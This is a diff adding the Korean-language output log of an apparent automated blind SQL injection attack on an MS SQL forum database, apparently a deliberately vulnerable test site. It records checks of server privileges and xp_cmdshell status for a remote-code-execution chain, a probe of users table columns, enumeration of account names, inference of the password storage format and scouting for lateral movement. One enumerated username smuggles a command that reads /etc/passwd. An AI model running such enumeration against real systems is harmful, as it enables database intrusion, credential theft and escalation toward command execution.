@@ -1,0 +1,76 @@
+### 0. 오라클 기준선 확인
+  TRUE 기준선 : True  FALSE 기준선 : False
+
+### 1. 현재 세션 주체 / 서버
+  DB_NAME() = acuforum
+  SYSTEM_USER = acunetix
+  SUSER_SNAME() = acunetix
+  USER_NAME() = acunetix
+  SERVERPROPERTY(ProductVersion) = <?>
+  SERVERPROPERTY(Edition) = <?>
+
+### 2. 권한 등급 (RCE 사슬 판정 핵심)
+  FALSE  IS_SRVROLEMEMBER('sysadmin')=1
+  FALSE  IS_SRVROLEMEMBER('sysadmin','acunetix')=1
+  FALSE  IS_SRVROLEMEMBER('serveradmin')=1
+  FALSE  IS_SRVROLEMEMBER('securityadmin')=1
+  FALSE  IS_MEMBER('db_owner')=1
+  FALSE  HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER')=1
+  FALSE  HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS')=1
+  =        1   sysadmin 로그인 수
+
+### 3. xp_cmdshell / OLE / CLR 설정 상태 (조회만 — 변경 안 함)
+  value_in_use = 0   xp_cmdshell
+  value_in_use = 0   show advanced options
+  value_in_use = 0   Ole Automation
+  value_in_use = 0   clr enabled
+  value_in_use = 0   Ad Hoc Distributed Queries
+  value_in_use = 0   Agent XPs
+  TRUE   OBJECT_ID('sys.xp_cmdshell') IS NOT NULL (확장프로시저 존재)
+  =       69   sys.configurations 행 수(조회권한 확인)
+  FALSE  xp_cmdshell 프로시저 호출권한(EXECUTE) 보유
+
+### 4. users 테이블 구조
+  =     1000   users 행 수
+  =        5   users 컬럼 수
+  TRUE   컬럼 'uname' 존재
+  TRUE   컬럼 'upass' 존재
+  FALSE  컬럼 'id' 존재
+  FALSE  컬럼 'userid' 존재
+  TRUE   컬럼 'email' 존재
+  FALSE  컬럼 'isadmin' 존재
+  FALSE  컬럼 'is_admin' 존재
+  FALSE  컬럼 'admin' 존재
+  FALSE  컬럼 'ulevel' 존재
+  FALSE  컬럼 'level' 존재
+  FALSE  컬럼 'ustatus' 존재
+  FALSE  컬럼 'fullname' 존재
+  FALSE  컬럼 'uemail' 존재
+  FALSE  컬럼 'upwd' 존재
+  FALSE  컬럼 'pwd' 존재
+  FALSE  컬럼 'pass' 존재
+  =        4   게시판 테이블 수
+
+### 5. 계정명 열거 (uname ASC 순회)
+  [1] ' || a==a'
+  [2] ' || a==b'
+  [3] '\r\ncat /e*c/p*swd'
+
+### 6. 비밀번호 저장형식 판정 (값은 저장하지 않음)
+  TRUE   upass 길이 <= 12 (평문 가능성)
+  TRUE   upass 길이 >= 32 (해시 가능성)
+  TRUE   upass 가 uname 과 동일한 행 존재
+  TRUE   upass 가 16진 문자열만 사용
+  TRUE   upass 상위24자리에서 헥스 확인
+  =       20   upass 평균길이(정수부)
+
+### 7. 계정-비밀번호 일치 오라클 (평문 후보 직접검증, 해시 후보는 HASHBYTES 대조)
+
+### 8. 측면 확장 가능성 (읽기 전용 사실조사)
+  =        1   연결된 서버 수
+  =        7   사용자 DB 수
+  TRUE   TABLES 에 'users' 존재
+  TRUE   sys.sql_logins 조회 가능
+  @@VERSION(60자) = Microsoft SQL Server 2014 (SP3-GDR) (KB5029184) - 12.0.6179.
+
+### 완료 — 총 요청 1126건 → out/db_facts.json
